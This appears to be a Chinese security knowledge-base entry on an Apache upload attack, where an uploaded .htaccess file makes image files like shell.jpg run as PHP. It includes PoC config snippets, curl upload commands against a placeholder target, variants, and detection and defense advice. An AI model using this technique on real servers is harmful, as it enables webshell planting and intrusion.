---
id: web-generic-file-upload-htaccess-handler-override
title: Apache 未禁用 .htaccess 时上传分布式配置，将图片后缀交给 PHP 解析
type: scenario
domain: web
path: web/generic/file-upload
technique: htaccess-handler-override
tags:
- web
- file-upload
- apache
- htaccess
- handler
- webshell
- php
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:40:18+08:00'
  notes: 已对照原文与图18-23核对：黑名单只拦脚本后缀，.htaccess 可上传，SetHandler 使 shell.jpg 由 PHP 解析（图21 显示 PHP 5.6.40）。核对时修正触发条件：Apache 默认 AllowOverride 是 None，改为“上传目录 AllowOverride 设为 FileInfo/All（不少站点会放开）”。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-htaccess-handler-override/
draft: false
kb_aliases:
- .htaccess 上传
- Apache 分布式配置覆盖
- SetHandler 解析图片
- AddType 解析 png
- upload-labs htaccess
---

## 一句话结论

上传目录所在的 Apache 允许 `.htaccess` 生效，且黑名单没有拦截该文件名时，攻击者上传一段 `SetHandler`/`AddType` 配置，就能让本来只是图片后缀的 `shell.jpg` 被 PHP 解释器执行。

## 原理

- Apache 在每个目录中查找 `AccessFileName`（默认 `.htaccess`）。只要对应目录的 `AllowOverride` 不是 `None`，就会读取并应用其中的 `SetHandler`、`AddType` 等指令。
- 后端只按扩展名黑名单拒绝 `php` 等脚本后缀，却没有把 `.htaccess` 列入黑名单；`.htaccess` 本身不是脚本，因此能正常落盘。
- 落盘后的 `.htaccess` 改变了该目录的解析规则：`<FilesMatch "shell.jpg"> SetHandler application/x-httpd-php </FilesMatch>` 只把 `shell.jpg` 交给 PHP；`AddType application/x-httpd-php .png` 则让所有 `.png` 都走 PHP。
- 关键点是“解析器选择”和“文件内容校验”分离：文件内容仍是图片/文本，Apache 却按配置调用 PHP 解析，于是其中的 PHP 代码被执行。

## 触发条件

- Web 服务器为 Apache，且上传目录或其父目录的 `AllowOverride` 设为 `FileInfo`/`All`（Apache 默认是 `None`，但不少站点为方便配置会放开）。
- 上传接口的黑名单未包含 `.htaccess`，且允许无后缀/点开头的文件名落盘。
- 上传目录可被 Web 访问，且攻击者能控制该目录下的文件内容。

## 利用步骤

1. 先上传一个 `.txt` 或图片，确认接口只做扩展名黑名单，且文件落在可访问目录。
2. 构造 `.htaccess`，把目标图片名或某个后缀映射到 PHP handler。
3. 上传 `.htaccess`，再上传内容为 PHP 代码的 `shell.jpg`（文件名与配置匹配）。
4. 访问 `http://target/upload/shell.jpg`，由 Apache 调用 PHP 执行其中的代码。

## PoC

`.htaccess`（只让 `shell.jpg` 解析为 PHP）：

```apache
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

或让该目录所有 `.png` 解析为 PHP：

```apache
AddType application/x-httpd-php .png
```

随后上传：

```bash
curl -s -X POST 'http://target/upload.php' -F 'file=@.htaccess;filename=.htaccess'
curl -s -X POST 'http://target/upload.php' -F 'file=@shell.jpg;filename=shell.jpg;type=image/jpeg'
curl -s 'http://target/upload/shell.jpg'
```

`shell.jpg` 内容示例：`<?php phpinfo(); ?>`。

## 变体与关联

- 变体：`AddHandler application/x-httpd-php .jpg`；用 `<Files "shell.jpg">` 精确匹配；若 `.htaccess` 被拦，可尝试 `.user.ini`（PHP-FPM 场景，`auto_prepend_file`）等其他每目录配置。
- 关联：[[web-generic-file-upload-extension-zero-check]]（扩展名零校验直接落脚本）；[[web-generic-file-upload-apache-alternate-php-extension]]（不改配置，利用 Apache 默认可解析后缀）。
- 边界：若 `AllowOverride None`、上传目录禁止覆盖配置，或 `.htaccess` 被重命名/过滤，本手法不成立。

## 检测与防御

- 检测：上传目录出现 `.htaccess`、`.user.ini` 等配置文件；配置中出现 `SetHandler`/`AddType` 指向 PHP；图片扩展名文件被 PHP 进程处理。
- 防御：上传目录设置 `AllowOverride None`；禁止上传点接受点开头或无扩展名文件；服务端白名单只允许业务需要的图片类型并重命名；上传目录关闭脚本解析或放到独立静态域名。
